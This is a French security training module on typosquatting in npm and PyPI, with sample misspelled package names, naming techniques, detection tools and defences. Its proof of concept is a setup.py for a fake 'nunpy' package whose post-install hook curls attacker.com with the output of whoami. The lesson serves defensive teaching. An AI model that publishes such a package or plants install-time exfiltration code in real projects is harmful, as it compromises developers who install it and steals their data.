# Module A16 : Typosquatting - Packages malveillants similaires

## Objectifs pédagogiques

- Comprendre le typosquatting de packages
- Identifier les cibles (packages populaires)
- Créer un package typosquatté (PoC)
- Détecter et se protéger

## Introduction

**Typosquatting** consiste à publier un package avec un nom très similaire à un package légitime populaire, en espérant que les développeurs fassent une faute de frappe.

```
┌────────────────────────────────────────────┐
│         Exemples Typosquatting             │
└────────────────────────────────────────────┘

Package légitime  →  Typosquat malveillant
─────────────────────────────────────────────
requests          →  request
numpy             →  nmupy, nunpy
tensorflow        →  tensorflaw
lodash            →  lodsh, loadash
```

## Techniques

1. **Caractère manquant** : `lodash` → `lodsh`
2. **Inversion** : `requests` → `reqeusts`
3. **Caractère double** : `flask` → `fllask`
4. **Homoglyphe** : `lodash` → `l0dash` (0 au lieu de o)

## PoC (PyPI)

**setup.py :**
```python
from setuptools import setup
from setuptools.command.install import install
import os
import requests

class PostInstall(install):
    def run(self):
        # Code malveillant
        os.system('curl https://attacker.com/?stolen=$(whoami)')
        install.run(self)

setup(
    name='nunpy',  # typosquat de numpy
    version='1.26.0',  # version récente pour sembler légitime
    cmdclass={'install': PostInstall},
)
```

**Résultat :**
```bash
pip install nunpy  # faute de frappe
# → Exécute le code malveillant
```

## Détection

**Outils :**
```bash
# Typo-detector pour npm
npm install -g @lirantal/anti-typosquatting
anti-typosquatting scan package.json

# Vérifier la popularité avant install
npm view <package> downloads
```

## Résumé

- Typosquatting = nom similaire au package légitime
- Exploite les fautes de frappe des développeurs
- Code malveillant exécuté à l'installation
- Défense : vérifier nom exact, utiliser lock files, outils de détection

## Ressources

- **Typosquatting Research** : https://www.pytosquatting.overtag.dk/
- **npm anti-typosquatting** : https://github.com/lirantal/anti-typosquatting

---

**Module suivant** : [Build Compromise](../03-Build-Compromise/)
